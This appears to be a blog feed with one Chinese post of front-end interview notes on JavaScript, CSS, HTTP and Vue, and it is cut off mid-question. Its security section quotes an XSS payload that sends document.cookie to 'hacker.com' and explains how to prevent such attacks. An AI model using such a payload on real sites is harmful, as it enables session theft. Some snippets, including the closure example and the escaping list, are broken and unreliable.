<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wangsiyuan</title>
  
  <subtitle>小马过河</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="wangsiyuan233.github.io/"/>
  <updated>2018-07-18T17:25:57.848Z</updated>
  <id>wangsiyuan233.github.io/</id>
  
  <author>
    <name>wangsiyuan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>前端总结2</title>
    <link href="wangsiyuan233.github.io/2018/07/17/61%E5%89%8D%E7%AB%AF%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%932/"/>
    <id>wangsiyuan233.github.io/2018/07/17/61前端题目总结2/</id>
    <published>2018-07-17T07:52:52.000Z</published>
    <updated>2018-07-18T17:25:57.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><blockquote><p>JS 有哪些数据类型？</p></blockquote><p>string number bool undefined null object symbol<br>object 包括了数组、函数、正则、日期等对象<br>一旦出现（数组、函数、正则、日期、NaN）直接0分<br><a id="more"></a></p><blockquote><p>（必考） Promise 怎么使用？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/04/01/36%E5%BC%82%E6%AD%A5%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">深入理解JavaScript–异步系列(2)</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">then</div><div class="line">  $.ajax(...).then(成功函数, 失败函数)</div><div class="line">链式 then</div><div class="line">  $.ajax(...).then(成功函数, 失败函数).then(成功函数<span class="number">2</span>, 失败函数<span class="number">2</span>)</div><div class="line">如何自己生成 <span class="built_in">Promise</span> 对象</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">xxx</span>(<span class="params"></span>)</span>&#123;</div><div class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</div><div class="line">          setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</div><div class="line">              resolve() 或者 reject()</div><div class="line">          &#125;,<span class="number">3000</span>)</div><div class="line">      &#125;)</div><div class="line">  &#125;</div><div class="line">  xxx().then(...)</div></pre></td></tr></table></figure></p><blockquote><p>（必考） AJAX 手写一下？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/02/16/16AJAX%EF%BC%88%E4%B8%80%EF%BC%89/" target="_blank" rel="external">封装一个ajax</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</div><div class="line">xhr.open(<span class="string">'POST'</span>, <span class="string">'/xxxx'</span>)</div><div class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">200</span>)&#123;</div><div class="line">        <span class="built_in">console</span>.log(xhr.responseText)</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">xhr.send(<span class="string">'a=1&amp;b=2'</span>)</div></pre></td></tr></table></figure></p><blockquote><p>（必考）闭包是什么？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/03/07/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-1/" target="_blank" rel="external">深入理解JavaScript–闭包系列(1)</a><br><a href="http://wangsiyuan233.cn/2018/03/07/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">深入理解JavaScript–闭包系列(2)</a><br><a href="http://wangsiyuan233.cn/2018/03/07/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">深入理解JavaScript–闭包系列(3)</a><br><a href="http://wangsiyuan233.cn/2018/03/07/28%E9%97%AD%E5%8C%85%E7%B3%BB%E5%88%97-4/" target="_blank" rel="external">深入理解JavaScript–闭包系列(4)</a><br><a href="https://zhuanlan.zhihu.com/p/22486908" target="_blank" rel="external">JS 中的闭包是什么？</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> n = <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        n += <span class="number">1</span></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">let</span>  adder = ()</div><div class="line">adder() <span class="comment">// n === 1</span></div><div class="line">adder() <span class="comment">// n === 2</span></div><div class="line"><span class="built_in">console</span>.log(n) <span class="comment">// n is not defined</span></div></pre></td></tr></table></figure></p><blockquote><p>（必考）这段代码里的 this 是什么？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/03/04/27%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">聊聊系列(2)–this</a></p><blockquote><p>（必考）什么是立即执行函数？使用立即执行函数的目的是什么？</p></blockquote><p>造出一个函数作用域，防止污染全局变量<br>ES 6 新语法 <code>{let  name}</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;())</div><div class="line">;(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;)()</div><div class="line">!!!!!!!<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;()</div><div class="line">~<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> name</div><div class="line">&#125;()</div></pre></td></tr></table></figure></p><blockquote><p>async/await 语法了解吗？目的是什么？</p></blockquote><p>把异步代码写成同步代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">returnPromise</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>( <span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</div><div class="line">        setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</div><div class="line">            resolve(<span class="string">'fuck'</span>)</div><div class="line">        &#125;,<span class="number">3000</span>)</div><div class="line">    &#125;)</div><div class="line">&#125;</div><div class="line"></div><div class="line">returnPromise().then(<span class="function">(<span class="params">result</span>)=&gt;</span>&#123;</div><div class="line">    result === <span class="string">'fuck'</span></div><div class="line">&#125;)</div><div class="line"></div><div class="line"><span class="keyword">var</span> result = <span class="keyword">await</span> returnPromise()</div><div class="line">result === <span class="string">'fuck'</span></div></pre></td></tr></table></figure></p><blockquote><p>如何实现深拷贝？</p></blockquote><p>1) JSON 来深拷贝<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="meta">&#123;...&#125;</span></div><div class="line"><span class="keyword">var</span> b = <span class="type">JSON</span>.parse( <span class="type">JSON</span>.stringify(a) )</div></pre></td></tr></table></figure></p><p>缺点：JSON 不支持函数、引用、undefined、RegExp、Date……<br>2) 递归拷贝<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">object</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> object2</div><div class="line">    <span class="keyword">if</span>(! (object <span class="keyword">instanceof</span> <span class="built_in">Object</span>) )&#123;</div><div class="line">        <span class="keyword">return</span> object</div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(object <span class="keyword">instanceof</span> <span class="built_in">Array</span>)&#123;</div><div class="line">        object2 = []</div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(object <span class="keyword">instanceof</span> <span class="built_in">Function</span>)&#123;</div><div class="line">        object2 = <span class="built_in">eval</span>(object.toString())</div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(object <span class="keyword">instanceof</span> <span class="built_in">Object</span>)&#123;</div><div class="line">        object2 = &#123;&#125;</div><div class="line">    &#125;</div><div class="line">    你也可以把 <span class="built_in">Array</span> <span class="built_in">Function</span> <span class="built_in">Object</span> 都当做 <span class="built_in">Object</span> 来看待，参考 https:<span class="comment">//juejin.im/post/587dab348d6d810058d87a0a</span></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> object)&#123;</div><div class="line">        object2[key] = clone(object[key])</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> object2</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>3) 环<br>4) <code>RegExp、Date、Set、Symbol、WeakMap</code></p><blockquote><p>如何实现数组去重？</p></blockquote><p>1) 计数排序的逻辑（只能正整数）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">var a = [4,2,5,6,3,4,5]</div><div class="line"> var <span class="built_in">hash</span>Tab = &#123;&#125;</div><div class="line"> <span class="keyword">for</span>(<span class="built_in">let</span> i=0; i&lt;a.length;i++)&#123;</div><div class="line">     <span class="keyword">if</span>(a[i] <span class="keyword">in</span> <span class="built_in">hash</span>Tab)&#123;</div><div class="line">         // 什么也不做</div><div class="line">     &#125;<span class="keyword">else</span>&#123;</div><div class="line">         <span class="built_in">hash</span>Tab[ a[i] ] = <span class="literal">true</span></div><div class="line">     &#125;</div><div class="line"> &#125;</div><div class="line"> //<span class="built_in">hash</span>Tab: &#123;4: <span class="literal">true</span>, 2: <span class="literal">true</span>, 5: <span class="literal">true</span>, 6:<span class="literal">true</span>, 3: <span class="literal">true</span>&#125;</div><div class="line"> console.log(Object.keys(<span class="built_in">hash</span>Tab)) // [<span class="string">'4'</span>,<span class="string">'2'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'3'</span>]</div></pre></td></tr></table></figure></p><p>2) Set 去重<br> <code>Array.from(new Set(a))</code><br>3) WeakMap 任意类型去重</p><blockquote><p>如何用正则实现 string.trim() ？</p></blockquote><figure class="highlight qml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">trim</span>(<span class="params">string</span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">string</span>.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">''</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p>JS 原型是什么？</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/23090041" target="_blank" rel="external">什么是 JS 原型链？</a><br><a href="http://wangsiyuan233.cn/2018/02/23/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-1/" target="_blank" rel="external">深入理解JavaScript–原型系列(1)</a><br><a href="http://wangsiyuan233.cn/2018/02/23/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-2/" target="_blank" rel="external">深入理解JavaScript–原型系列(2)</a><br><a href="http://wangsiyuan233.cn/2018/02/23/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">深入理解JavaScript–原型系列(3)</a><br><a href="http://wangsiyuan233.cn/2018/02/23/22%E5%8E%9F%E5%9E%8B%E7%B3%BB%E5%88%97-4/" target="_blank" rel="external">深入理解JavaScript–原型系列(4)</a><br><a href="http://wangsiyuan233.cn/2018/02/18/17%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%AE%9E%E4%BE%8B/" target="_blank" rel="external">原型链实例</a></p><blockquote><p>ES 6 中的 class 了解吗？</p></blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes" target="_blank" rel="external">MDN - 类</a></p><blockquote><p>JS 如何实现继承？</p></blockquote><p>1） 原型链<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params"></span>)</span>&#123;</div><div class="line">      <span class="keyword">this</span>.body = <span class="string">'身体'</span></div><div class="line">  &#125;</div><div class="line">  Animal.prototype.move = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Human</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">      Animal.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>)</div><div class="line">      <span class="keyword">this</span>.name = name</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// Human.prototype.__proto__ = Animal.prototype // 非法</span></div><div class="line"></div><div class="line">  <span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</div><div class="line">  f.prototype = Animal.prototype</div><div class="line">  Human.prototype = <span class="keyword">new</span> f()</div><div class="line"></div><div class="line">  Human.prototype.useTools = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> frank = <span class="keyword">new</span> Human()</div></pre></td></tr></table></figure></p><p>2) extends 关键字<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</div><div class="line">    constructor()&#123;</div><div class="line">        <span class="keyword">this</span>.body = '身体'</div><div class="line">    &#125;,</div><div class="line">    move()&#123;&#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animal</span></span>&#123;</div><div class="line">    constructor(name)&#123;</div><div class="line">        <span class="keyword">super</span>()</div><div class="line">        <span class="keyword">this</span>.name = name</div><div class="line">    &#125;,</div><div class="line">    useTools()&#123;&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> frank = <span class="keyword">new</span> <span class="type">Human</span>()</div></pre></td></tr></table></figure></p><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><blockquote><p>如何居中？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/03/28/33CSS%E5%B8%83%E5%B1%80%E6%96%B9%E6%A1%88%E4%B9%8Bflex-float/" target="_blank" rel="external">关于居中的一点点思考</a></p><blockquote><p>（必考） 说说盒模型。</p></blockquote><p>1）盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)<br>2）有两种， IE 盒子模型、标准 W3C 盒子模型；IE的content部分包含了 border 和 padding;<br><img src="https://i.imgur.com/v7kdhsX.jpg" alt=""><br>content-box: width == 内容区宽度<br>border-box: width == 内容区宽度 + padding 宽度 + border 宽度</p><blockquote><p>css reset 和 normalize.css 有什么区别？</p></blockquote><p>1）reset 重置，之前的样式我不要，<code>a{color: red;}</code>，抛弃默认样式<br>2）normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。</p><blockquote><p>选择器优先级如何确定？</p></blockquote><p><strong>CSS 选择符：</strong><br>1.id选择器(# myid)<br>2.类选择器(.myclassname)<br>3.标签选择器(div, h1, p)<br>4.相邻选择器(h1 + p)<br>5.子选择器(ul &gt; li)<br>6.后代选择器(li a)<br>7.通配符选择器( * )<br>8.属性选择器(a[rel = “external”])<br>9.伪类选择器(a: hover, li:nth-child)</p><p><strong>优先级算法：</strong><br>1.优先级就近原则，同权重情况下样式定义最近者为准;<br>2.载入样式以最后载入的定位为准;<br>3.!important &gt;  id &gt; class &gt; tag<br>4.important 比 内联优先级高，但内联比 id 要高</p><blockquote><p>BFC 是什么？</p></blockquote><p>overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）<br>overflow:hidden 取消父子 margin 合并。<a href="http://jsbin.com/conulod/1/edit?html,css,js,output" target="_blank" rel="external">（代码演示）</a>（方方用 padding-top: 1px;）</p><blockquote><p>如何清除浮动？</p></blockquote><p><a href="http://www.iyunlu.com/view/css-xhtml/55.html" target="_blank" rel="external">那些年我们一起清除过的浮动</a></p><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><blockquote><p>（必考） 你是如何理解 HTML 语义化的？</p></blockquote><p>1） 去掉或者丢失样式的时候能够让页面呈现出清晰的结构<br>2） 有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；<br>3） 方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；<br>4） 便于团队开发和维护，语义化使得网页更具可读性，是进一步开发网页的必要步骤，遵循W3C标准的团队都遵循这个标准，可以减少差异化。</p><blockquote><p>meta viewport 是做什么用的，怎么写？</p></blockquote><p> <code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</code><br> 控制页面在移动端不要缩小显示。<br> 一开始，所有页面都是给PC准备的，乔布斯推出 iPhone 3GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 980px，页面缩小。<br> 后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。</p><blockquote><p>canvas 元素是干什么的？</p></blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API" target="_blank" rel="external">canvas 入门手册</a></p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><blockquote><p>DOM 事件模型是什么？</p></blockquote><p>1)冒泡<br>2)捕获<br>3)如果这个元素是被点击的元素，那么捕获不一定在冒泡之前，<a href="http://jsbin.com/raqakog/1/edit?js,console,output" target="_blank" rel="external">顺序是由监听顺序决定的。</a></p><blockquote><p>移动端的触摸事件了解吗？</p></blockquote><p>1）touchstart touchmove touchend touchcancel<br>2）模拟 swipe 事件：记录两次 touchmove 的位置差，如果后一次在前一次的右边，说明向右滑了。</p><blockquote><p>事件委托是什么？有什么好处？</p></blockquote><p>1）假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，看触发事件的元素是哪个儿子，这就是事件委托。<br>2）可以监听还没有出生的儿子（动态生成的元素）。省监听器。<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">(element, eventType, selector, fn)</span>&#123;</span></div><div class="line"> element.addEventListener(eventType, <span class="keyword">e</span>=&gt;&#123;</div><div class="line">     <span class="keyword">if</span>(<span class="keyword">e</span>.target.matches(selector))&#123;</div><div class="line">         fn.<span class="keyword">call</span>(<span class="keyword">el</span>, <span class="keyword">e</span>, <span class="keyword">el</span>)</div><div class="line">     &#125;</div><div class="line"> &#125;)</div><div class="line">&#125;// 有 bug 但是可以应付面试官的事件委托</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">(element, eventType, selector, fn)</span> &#123;</span></div><div class="line"> element.addEventListener(eventType, <span class="keyword">e</span> =&gt; &#123;</div><div class="line">     <span class="keyword">let</span> <span class="keyword">el</span> = <span class="keyword">e</span>.target</div><div class="line">     <span class="keyword">while</span> (!el.matches(selector)) &#123;</div><div class="line">         <span class="keyword">if</span> (element === <span class="keyword">el</span>) &#123;</div><div class="line">             <span class="keyword">el</span> = null</div><div class="line">             <span class="keyword">break</span></div><div class="line">         &#125;</div><div class="line">         <span class="keyword">el</span> = <span class="keyword">el</span>.parentNode</div><div class="line">     &#125;</div><div class="line">     <span class="keyword">el</span> &amp;&amp; fn.<span class="keyword">call</span>(<span class="keyword">el</span>, <span class="keyword">e</span>, <span class="keyword">el</span>)</div><div class="line"> &#125;)</div><div class="line"> <span class="keyword">return</span> element</div><div class="line">&#125; // 工资 <span class="number">12</span><span class="keyword">k</span>+ 的前端写的事件委托</div><div class="line">listen(ul, <span class="string">'click'</span>, <span class="string">'li'</span>, ()=&gt;&#123;&#125;)</div><div class="line"></div><div class="line">ul&gt;li*<span class="number">5</span>&gt;span</div></pre></td></tr></table></figure></p><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><blockquote><p>HTTP 状态码知道哪些？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/04/02/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>301 和 302 的区别是什么？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/04/02/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>HTTP 缓存怎么做？</p></blockquote><p><a href="http://imweb.io/topic/5795dcb6fb312541492eda8c" target="_blank" rel="external">HTTP缓存控制小结</a><br>1）<code>Cache-Control: max-age=300</code><br>2）避开缓存</p><blockquote><p>Cookie 是什么？Session 是什么？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/02/19/18Cookie/" target="_blank" rel="external">小饼干</a><br><a href="http://wangsiyuan233.cn/2018/02/20/19%E7%BC%93%E5%AD%98/" target="_blank" rel="external">缓存</a></p><blockquote><p>LocalStorage 和 Cookie 的区别是什么？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/02/20/19%E7%BC%93%E5%AD%98/" target="_blank" rel="external">缓存</a></p><blockquote><p>（必考）GET 和 POST 的区别是什么？</p></blockquote><p>1）参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。<br>2）安全（扯淡）。GET 没有 POST 安全（都不安全）<br>3）GET 的参数（url查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）<br>4）包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）<br>5）GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）</p><p><a href="http://wangsiyuan233.cn/2018/04/02/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>（必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？</p></blockquote><p><a href="https://segmentfault.com/a/1190000009624849" target="_blank" rel="external">同源策略与JS跨域（JSONP , CORS）</a><br><a href="https://www.jianshu.com/p/96a94b92e94e" target="_blank" rel="external">JSONP、CROS和postMessage跨域</a></p><h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><blockquote><p>（必考）Vue 有哪些生命周期钩子函数？</p></blockquote><p><a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90" target="_blank" rel="external">官方文档</a></p><blockquote><p>（必考）Vue 如何实现组件通信？</p></blockquote><p>1）父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）<br>2）爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）<br>3）<a href="https://cn.vuejs.org/v2/guide/state-management.html" target="_blank" rel="external">兄弟通信（new Vue() 作为 eventBus）</a></p><blockquote><p>Vuex 的作用是什么？</p></blockquote><p><a href="https://vuex.vuejs.org/zh/guide/" target="_blank" rel="external">官方文档</a></p><blockquote><p>VueRouter 路由是什么？</p></blockquote><p><a href="https://router.vuejs.org/zh/guide/#html" target="_blank" rel="external">官方文档</a><br><a href="http://www.cnblogs.com/keepfool/p/5690366.html" target="_blank" rel="external">Vue.js——vue-router 60分钟快速入门</a></p><blockquote><p>Vue 的双向绑定是如何实现的？有什么缺点？</p></blockquote><p><a href="https://cn.vuejs.org/v2/guide/reactivity.html" target="_blank" rel="external">深入响应式原理</a></p><blockquote><p>Computed 计算属性的用法？跟 Methods 的区别。</p></blockquote><p>1）computed是响应式的，methods并非响应式。<br>2）调用方式不一样，computed定义的成员像属性一样访问，methods定义的成员必须以函数形式调用。<br>3）computed是带缓存的，只有其引用的响应式属性发生改变时才会重新计算，而methods里的函数在每次调用时都要执行。<br>4）computed中的成员可以只定义一个函数作为只读属性，也可以定义get/set变成可读写属性，这点是methods中的成员做不到的</p><p>在我们的实际开发中，有时很难去确定具体用computed还是methods，因为这两种方法最后的到的结果是一样的，但是他们的原理和用法却完全不同，比如：我们想去时刻监控数据的变化，在视图上显示不同的结果，当然这两中方法都可以实现这种效果，这个时候用computed就比较合理了，因为computed是可缓存的，只要数据层值不改变，computed就不会去改变，而且可缓存，如果数据层的值变了，computed就会实时更新到视图层上，所以说computed是响应式的。</p><p>还有一个不同点就是在于computed是以对象的属性方式存在的，在视图层直接调用就可以得到值，而methods必须以函数形式调用，可见，computed直接以对象属性方式调用，而methods必须要函数执行才可以得到结果。</p><h1 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h1><blockquote><p>什么是 XSS 攻击？如何预防？</p></blockquote><p>1）举例<br><code>div.innerHTML = userComment</code><br>// userComment<br>内容是 <code>&lt;script&gt;$.get(&#39;http://hacker.com?cookie=&#39;+document.cookie)&lt;/script&gt;</code><br>// 恶意就被执行了，这就是 XSS<br>2)<br>2.1不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行<br>2.2如果你一样要用 innerHTML，字符过滤<br>把 &lt; 替换成 &lt;<br>把 &gt; 替换成 &gt;<br>把 &amp; 替换成 &amp;<br>把 ‘ 替换成 &#39;<br>把 ‘ 替换成 &quot;<br>代码 <code>div.innerHTML = userComment.replace(/&gt;/g, &#39;&amp;lt;&#39;).replace...</code><br>2.3使用 CSP Content Security Policy</p><blockquote><p>什么是 CSRF 攻击？如何预防？</p></blockquote><p>1)过程<br>用户在 qq.com 登录<br>用户切换到 <code>hacker.com</code>（恶意网站）<br>hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。<br>用户在不知不觉中添加 hacker 为好友。<br>用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。<br>2）避免<br>检查 referer，qq.com 可以拒绝来自<code>hacker.com</code> 的请求<br><code>csrf_token</code> 来解决</p><h1 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h1><blockquote><p>转译出的文件过大怎么办？</p></blockquote><p>1）使用 code split<br>2）写法<code>import(&#39;xxx&#39;).then(xxx=&gt;{console.log(xxx)})</code><br>3）xxx 模块就是按需加载的</p><blockquote><p>转译速度慢什么办？</p></blockquote><p>对不起我不会好吗，什么问题</p><blockquote><p>写过 webpack loader 